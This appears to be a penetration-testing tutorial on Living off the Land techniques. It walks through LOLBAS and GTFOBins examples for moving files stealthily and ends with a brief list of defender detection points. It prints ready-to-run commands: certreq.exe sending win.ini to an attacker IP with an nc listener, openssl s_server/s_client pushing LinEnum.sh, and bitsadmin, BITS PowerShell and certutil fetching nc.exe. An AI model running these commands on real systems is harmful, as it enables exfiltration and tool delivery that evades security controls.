
# Living off the Land (LOTL / LOLBins)

## What Is “Living off the Land”

The term **Living off the Land** was introduced by **Christopher Campbell (@obscuresec)** and **Matt Graeber (@mattifestation)** at DerbyCon 3.

It refers to an attack technique where an attacker **uses legitimate, built-in system binaries** to perform malicious actions instead of dropping custom tools. Because these binaries are trusted and signed by the operating system vendor, they often bypass security controls.

---

## LOLBins (Living off the Land Binaries)

**LOLBins** are legitimate executables that can be abused to perform actions beyond their intended purpose.

Two main community resources catalogue these binaries:

* **LOLBAS** – Windows binaries
* **GTFOBins** – Linux binaries

These resources document:

* Binary name
* Abuse functionality
* Command examples
* MITRE ATT&CK techniques
* Detection considerations

---

## Common Capabilities of LOLBins

Living off the Land binaries can often perform:

* File download
* File upload
* Command execution
* File read
* File write
* Security control bypasses
* Persistence
* Privilege escalation (in some cases)

---

## Why LOTL Is Powerful

* No malware dropped to disk
* Uses signed, trusted binaries
* Blends with legitimate admin activity
* Often bypasses application whitelisting
* Reduces forensic footprint

This makes LOTL techniques extremely valuable in **restricted, monitored, or hardened environments**.

---

# Using LOLBAS (Windows)

## Searching LOLBAS

LOLBAS allows filtering by function:

* `/download`
* `/upload`
* `/execute`
* `/read`
* `/write`

---

## Example: CertReq.exe (Windows Upload)

`certreq.exe` is intended for certificate enrollment but can be abused to **exfiltrate files over HTTP**.

### Upload a File from Windows Target

```cmd
certreq.exe -Post -config http://192.168.49.128:8000/ C:\Windows\win.ini
```

This sends the file as an HTTP POST request.

---

### Catching the File on Attacker Machine

```bash
nc -lvnp 8000
```

You will receive the file contents in the HTTP body.

### Notes

* Some Windows versions lack the `-Post` option
* AMSI and EDR increasingly flag this technique
* Still useful in older or poorly monitored systems

---

# Using GTFOBins (Linux)

## Searching GTFOBins

GTFOBins supports function-based searches:

* `+file download`
* `+file upload`
* `+command execution`

---

## Example: OpenSSL File Transfer

OpenSSL is commonly installed and trusted. It can be abused to transfer files in an encrypted channel.

---

### Step 1: Create Certificate (Attacker)

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem \
-x509 -days 365 -out certificate.pem
```

---

### Step 2: Stand Up OpenSSL Server (Attacker)

```bash
openssl s_server -quiet -accept 80 \
-cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

This sends `LinEnum.sh` to anyone who connects.

---

### Step 3: Download from Compromised Host

```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

This retrieves the file over an encrypted TLS channel.

---

## Why This Works Well

* No wget or curl required
* Encrypted transport
* Common binary
* Often overlooked by defenders

---

# Other Common LOTL File Transfer Tools

## Bitsadmin (Windows)

Uses the Background Intelligent Transfer Service.

### Download Example

```powershell
bitsadmin /transfer job /priority foreground \
http://10.10.15.66:8000/nc.exe C:\Temp\nc.exe
```

### PowerShell BITS

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://10.10.10.32:8000/nc.exe `
-Destination C:\Windows\Temp\nc.exe
```

---

## Certutil (Windows)

Often described as “Windows wget”.

### Download Example

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

### Important Note

* Strongly monitored
* Detected by AMSI and most EDRs
* Still useful in legacy environments

---

# When to Use Living off the Land

LOTL techniques are ideal when:

* Application whitelisting is enforced
* Antivirus blocks custom tools
* Internet access is restricted
* Stealth is required
* You want to simulate real-world attackers

---

# Defender Perspective

Defenders should monitor:

* Unusual usage of admin binaries
* Network activity from system utilities
* HTTP POST requests from unexpected processes
* BITS jobs created by non-admin workflows
* Certutil misuse patterns

---

## Key Takeaway

Living off the Land is not about tools—it is about **abusing trust**.
The better you understand LOLBins and GTFOBins, the more adaptable and effective you become in restricted environments.

---
